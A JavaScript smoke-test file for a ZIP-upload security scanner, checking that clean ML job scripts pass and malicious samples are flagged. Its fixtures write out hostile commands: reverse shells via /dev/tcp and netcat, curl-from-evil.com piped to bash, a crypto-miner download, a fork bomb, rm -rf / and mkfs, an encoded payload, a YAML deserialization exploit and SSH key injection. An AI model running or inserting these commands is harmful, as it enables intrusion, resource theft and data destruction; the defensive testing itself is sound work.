/**
 * Quick smoke test for securityScanner.js
 * Creates test ZIP files with known malicious + clean content and verifies behavior.
 * 
 * Run: node tests/test-scanner.js
 */

const path = require("path");
const AdmZip = require("adm-zip");
const { scanZipFile } = require("../services/securityScanner");
const fs = require("fs");

const TEMP_DIR = path.join(__dirname, ".tmp-scanner-test");

// Ensure temp dir exists
if (!fs.existsSync(TEMP_DIR)) {
  fs.mkdirSync(TEMP_DIR, { recursive: true });
}

let passed = 0;
let failed = 0;

function createTestZip(name, files) {
  const zip = new AdmZip();
  for (const [filename, content] of Object.entries(files)) {
    zip.addFile(filename, Buffer.from(content, "utf8"));
  }
  const zipPath = path.join(TEMP_DIR, `${name}.zip`);
  zip.writeZip(zipPath);
  return zipPath;
}

function test(name, zipPath, expectSafe, expectCategories = []) {
  const result = scanZipFile(zipPath);
  const status = result.safe === expectSafe;
  const foundCategories = [...new Set(result.threats.map(t => t.category))];
  
  let categoryMatch = true;
  if (expectCategories.length > 0 && !expectSafe) {
    categoryMatch = expectCategories.every(c => foundCategories.includes(c));
  }

  if (status && categoryMatch) {
    console.log(`  ✅ PASS: ${name}`);
    passed++;
  } else {
    console.log(`  ❌ FAIL: ${name}`);
    console.log(`    Expected safe=${expectSafe}, got safe=${result.safe}`);
    if (!categoryMatch) {
      console.log(`    Expected categories: ${expectCategories.join(", ")}`);
      console.log(`    Found categories:    ${foundCategories.join(", ")}`);
    }
    if (result.threats.length > 0) {
      result.threats.forEach(t => {
        console.log(`    → [${t.severity}] ${t.rule} in ${t.file}:${t.line} — "${t.match}"`);
      });
    }
    failed++;
  }
  return result;
}

console.log("\n🛡️  Security Scanner Tests\n");

// ═══════════════════════════════════════════════════════════════
//  CLEAN FILES (should all PASS)
// ═══════════════════════════════════════════════════════════════
console.log("── Clean Files (should be safe) ──");

test("Legitimate ML training script", createTestZip("clean-ml", {
  "train.py": `
import torch
import torch.nn as nn
from torch.utils.data import DataLoader
import os

model = nn.Sequential(nn.Linear(784, 256), nn.ReLU(), nn.Linear(256, 10))
optimizer = torch.optim.Adam(model.parameters(), lr=0.001)

for epoch in range(10):
    for batch in DataLoader(dataset, batch_size=32):
        loss = nn.functional.cross_entropy(model(batch), labels)
        loss.backward()
        optimizer.step()

torch.save(model.state_dict(), "model.pth")
print("Training complete!")
`,
  "run.sh": `#!/bin/bash
#SBATCH --job-name=training
#SBATCH --output=output.log

module load cuda/11.8
source activate myenv
pip install -r requirements.txt
python train.py --epochs 10 --batch-size 32
echo "Job finished"
`,
}), true);

test("Legitimate data processing with wget", createTestZip("clean-wget", {
  "download.sh": `#!/bin/bash
# Download dataset
wget https://datasets.example.com/data.tar.gz -O /tmp/data.tar.gz
tar -xzf /tmp/data.tar.gz -C ./data/
python preprocess.py
`,
  "preprocess.py": `
import os
import subprocess
os.makedirs("output", exist_ok=True)
subprocess.run(["python", "process.py", "--input", "data/"])
`,
}), true);

test("Legitimate config files", createTestZip("clean-config", {
  "config.yaml": `
training:
  epochs: 100
  learning_rate: 0.001
  batch_size: 32
  optimizer: adam
model:
  architecture: resnet50
  pretrained: true
`,
  "params.json": `{
  "model_name": "bert-base-uncased",
  "max_seq_length": 512,
  "num_labels": 2
}`,
}), true);

test("Shell script with chmod +x and git clone", createTestZip("clean-chmod", {
  "setup.sh": `#!/bin/bash
git clone https://github.com/user/repo.git
chmod +x repo/run.sh
cd repo && pip install -e .
nvidia-smi
python main.py
`,
}), true);


// ═══════════════════════════════════════════════════════════════
//  MALICIOUS FILES (should all FAIL)
// ═══════════════════════════════════════════════════════════════
console.log("\n── Malicious Files (should be blocked) ──");

test("Bash reverse shell", createTestZip("mal-revshell", {
  "run.sh": `#!/bin/bash
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
`,
}), false, ["reverse_shell"]);

test("Fork bomb", createTestZip("mal-forkbomb", {
  "run.sh": `#!/bin/bash
:(){ :|:& };:
`,
}), false, ["fork_bomb"]);

test("Crypto miner", createTestZip("mal-miner", {
  "run.sh": `#!/bin/bash
wget https://evil.com/xmrig -O /tmp/xmrig
chmod +x /tmp/xmrig
/tmp/xmrig --pool stratum+tcp://pool.minexmr.com:4444 --user wallet123
`,
}), false, ["crypto_mining"]);

test("System destruction (rm -rf /)", createTestZip("mal-rmrf", {
  "run.sh": `#!/bin/bash
rm -rf / --no-preserve-root
`,
}), false, ["system_destruction"]);

test("Brute force tool", createTestZip("mal-bruteforce", {
  "attack.sh": `#!/bin/bash
hydra -l admin -P rockyou.txt ssh://192.168.1.1
`,
}), false, ["brute_force"]);

test("Netcat reverse shell", createTestZip("mal-netcat", {
  "run.sh": `#!/bin/bash
nc -e /bin/sh 10.0.0.1 4444
`,
}), false, ["reverse_shell"]);

test("Curl pipe to bash", createTestZip("mal-curlbash", {
  "run.sh": `#!/bin/bash
curl https://evil.com/payload.sh | bash
`,
}), false, ["dangerous_download"]);

test("Sudo privilege escalation", createTestZip("mal-sudo", {
  "run.sh": `#!/bin/bash
sudo chmod 4755 /usr/bin/node
`,
}), false, ["privilege_escalation"]);

test("Encoded payload", createTestZip("mal-b64", {
  "run.sh": `#!/bin/bash
echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE=" | base64 -d | bash
`,
}), false, ["encoded_payload"]);

test("YAML deserialization attack", createTestZip("mal-yaml", {
  "config.yaml": `
exploit: !!python/object/apply:os.system ["rm -rf /"]
`,
}), false, ["config_threat"]);

test("Mining pool in JSON config", createTestZip("mal-json-mining", {
  "config.json": `{
  "algo": "randomx",
  "pool": "stratum+tcp://pool.hashvault.pro:3333",
  "wallet": "4Abc123..."
}`,
}), false, ["crypto_mining"]);

test("Python exec with base64", createTestZip("mal-py-exec", {
  "exploit.py": `
import base64
exec(base64.b64decode("aW1wb3J0IG9z"))
`,
}), false, ["encoded_payload"]);

test("Network scanning with nmap", createTestZip("mal-nmap", {
  "scan.sh": `#!/bin/bash
nmap -sS -p 1-65535 192.168.1.0/24
`,
}), false, ["network_recon"]);

test("Slurm manipulation", createTestZip("mal-slurm", {
  "run.sh": `#!/bin/bash
scontrol update NodeName=worker1 State=DRAIN
`,
}), false, ["slurm_manipulation"]);

test("SSH authorized_keys injection", createTestZip("mal-ssh", {
  "run.sh": `#!/bin/bash
echo "ssh-rsa AAAA... attacker@evil" >> ~/.ssh/authorized_keys
`,
}), false, ["malware_persistence"]);

test("Disk format command", createTestZip("mal-mkfs", {
  "run.sh": `#!/bin/bash
mkfs.ext4 /dev/sda1
`,
}), false, ["system_destruction"]);

test("Exploitation framework reference", createTestZip("mal-msf", {
  "run.sh": `#!/bin/bash
msfconsole -r exploit.rc
`,
}), false, ["exploit_tools"]);


// ═══════════════════════════════════════════════════════════════
//  Cleanup
// ═══════════════════════════════════════════════════════════════
fs.rmSync(TEMP_DIR, { recursive: true, force: true });

console.log(`\n${"═".repeat(50)}`);
console.log(`Results: ${passed} passed, ${failed} failed, ${passed + failed} total`);
console.log(`${"═".repeat(50)}\n`);

process.exit(failed > 0 ? 1 : 0);
